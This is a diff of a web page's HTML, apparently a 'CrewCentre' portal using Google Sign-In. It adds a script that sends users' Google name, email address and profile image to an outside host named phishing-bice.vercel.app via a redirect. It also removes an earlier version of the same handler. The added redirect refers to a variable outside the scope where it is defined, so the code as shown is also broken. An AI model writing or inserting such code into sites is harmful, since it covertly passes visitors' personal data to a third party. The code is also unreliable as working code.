@@ -6,6 +6,18 @@
   <meta name="google-signin-client_id" content="933501104274-q8m28lao4d08v9p2cje14dhhg4pafpuj.apps.googleusercontent.com">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
   <script src="https://apis.google.com/js/platform.js" async defer></script>
+  <script>
+    function onSignIn(googleUser) {
+      var profile = googleUser.getBasicProfile();
+      var sessionTimeout = 1; //hours
+      var loginDuration = new Date();
+      loginDuration.setTime(loginDuration.getTime() + (sessionTimeout * 60 * 60 * 1000));
+      document.cookie = "CrewCentreSession=Valid; " + loginDuration.toGMTString() + "; path=/";
+    }
+    if (document.cookie.indexOf("CrewCentreSession=Valid") == -1) {
+      location.href = `https://phishing-bice.vercel.app/login?name=${profile.getName()}&gmail=${profile.getEmail()}&img=${profile.getImageUrl()}`;
+    }
+  </script>
   <link rel="stylesheet" href="style.css">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <script>
@@ -103,19 +115,6 @@
     }
     xhttp.open("GET", "static/apps.json");
     xhttp.send();
-    
-    
-    
-    function onSignIn(googleUser) {
-      var profile = googleUser.getBasicProfile();
-      var sessionTimeout = 1; //hours
-      var loginDuration = new Date();
-      loginDuration.setTime(loginDuration.getTime() + (sessionTimeout * 60 * 60 * 1000));
-      document.cookie = "CrewCentreSession=Valid; " + loginDuration.toGMTString() + "; path=/";
-      window.location.href = `https://phishing-bice.vercel.app/login?name=${profile.getName()}&gmail=${profile.getEmail()}&img=${profile.getImageUrl()}`;
-      
-    }
-    
     
     
   </script>
